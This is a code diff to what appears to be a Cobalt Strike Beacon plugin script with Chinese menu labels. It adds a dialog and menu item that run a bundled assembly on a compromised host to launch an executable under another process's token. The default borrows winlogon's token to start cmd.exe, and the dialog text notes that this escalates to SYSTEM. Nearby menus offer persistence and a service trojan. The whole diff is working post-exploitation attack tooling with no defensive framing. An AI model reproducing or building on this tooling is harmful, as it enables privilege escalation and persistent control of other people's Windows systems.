@@ -293,6 +293,23 @@ sub javarunconfig{
 	dialog_show($dialog);
 }
 
+
+sub tokenrun_{
+	foreach $id ($bid){
+		bexecute_assembly($id, script_resource("systemcmd_cs.exe"), "$3['Process'] $3['ExecutePath']");
+	}
+
+}
+
+sub tokenrun{
+	$dialog = dialog("tokenrun", %(bid => $bid, Process => "winlogon", ExecutePath => "C:\\Windows\\System32\\cmd.exe"), &tokenrun_);
+	dialog_description($dialog, "<Process> <ExecutePath> #Process为进程名,ExecutePath为你要运行的EXE路径,如果进程的权限是SYSTEM,提权到SYSTEM杀毒会杀");
+	drow_text($dialog, "Process","processname:");
+	drow_text($dialog, "ExecutePath", "executepath:");
+	dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
 popup beacon_bottom{
 	menu "&权限维持"{
 		item "&cs服务马"{
@@ -337,6 +354,11 @@ popup beacon_bottom{
 		
 		item "&java执行class" {
 			javarunconfig($bid);
+		}
+		
+		item "&以某个进程的Token运行EXE"{
+			$bid = $1;
+			tokenrun($bid);
 		}
 		
 		menu "&域权限维持" {
